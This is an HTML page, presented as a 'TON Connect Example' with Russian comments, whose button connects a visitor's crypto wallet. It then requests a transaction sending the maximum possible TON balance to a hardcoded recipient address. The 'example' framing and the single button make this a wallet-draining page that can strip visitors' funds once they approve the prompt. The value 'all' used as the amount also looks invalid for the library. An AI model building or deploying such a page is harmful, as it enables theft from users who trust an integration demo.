<!DOCTYPE html>
<html>
<head>
    <title>TON Connect Example</title>
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
</head>
<body>

<h1>TON Connect Example</h1>

<p>Это пример интеграции TON Connect и отправки максимально возможной суммы TON (требует подтверждения пользователя).</p>

<div id="ton-connect"></div>

<button onclick="connectCustom()">Подключить кошелек и отправить максимум TON</button>

<script>
    // Замените на ваш фактический URL приложения
    const manifestUrl = 'https://heronwaterwow.github.io/-cv/ton-main/tonconnect-manifest.json';
    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
        manifestUrl: manifestUrl,
        buttonRootId: 'ton-connect'
    });

    // Адрес вашего кошелька для получения TON
    const recipientAddress = 'UQA9or9rMdG8vk8wSX20LRapZgTUslxrHt-Oa4JCcAynwEEi';

    // Функция для подключения кошелька и отправки транзакции (максимальная сумма)
    async function connectCustom() {
        try {
            const connectedWallet = await tonConnectUI.connectWallet();
            console.log("Подключенный кошелек:", connectedWallet);

            // ВАЖНО: Устанавливаем сумму в 'all' для отправки максимума
            const tx = {
                validUntil: Date.now() + 5 * 60 * 1000,
                messages: [{
                    address: recipientAddress,
                    amount: 'all' // Отправить максимально возможную сумму
                }]
            };
            console.log("Объект транзакции:", tx);

            const result = await tonConnectUI.sendTransaction(tx);
            console.log("Результат транзакции:", result);
            alert("Транзакция отправлена (максимальная сумма)! Хэш: " + result.hash);

        } catch (error) {
            console.error("Тип ошибки:", typeof error);
            console.error("Ошибка:", error);
            console.error("Ошибка в строке:", JSON.stringify(error));
            alert("Транзакция не удалась. Смотрите консоль для деталей. Проверьте консоль на наличие ошибок.");
        }
    }
</script>

</body>
</html>



